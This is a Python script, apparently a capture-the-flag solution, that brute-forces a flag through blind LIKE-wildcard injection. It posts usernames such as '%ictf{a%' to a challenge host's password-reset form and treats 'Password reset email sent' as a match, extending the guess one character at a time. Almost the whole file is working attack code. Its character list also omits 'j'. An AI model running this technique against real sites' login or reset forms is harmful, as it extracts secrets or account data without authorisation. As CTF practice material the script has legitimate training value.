import aiohttp
import asyncio
def _(arg,end='\n'):
    pass
debug = _
host = 'http://like-it-or-not.031337.xyz'
guess = 'ictf{'
payload = list(guess+' '*50)
idx = len(guess)
asciz = list('abcdefghiklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0987654321_{}')
async def make_guess(c):
    global payload,idx
    flag = ''.join(e for e in ['%']+payload[:idx]+[c]+['%'])
    data = {'username':flag}
    debug(f'trying: {flag}',end='')
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(host, data=data) as r:
                text = await r.text()
                debug(f'==> [{r.status}]: {text}')
                if 'Password reset email sent' in text:
                    print(f'valid flag:{flag[1:-1]}')
                    payload[idx] = c
                    idx += 1
                elif 'ictf{' in text:
                    print(f'got: {text}')
                else:
                    return
    except Exception as e:
        print(f'Exception: {e}')
while True:
    for i in range(0, len(asciz)):
        c = asciz[i]
        loop = asyncio.get_event_loop()
        loop.run_until_complete(make_guess(c))
        
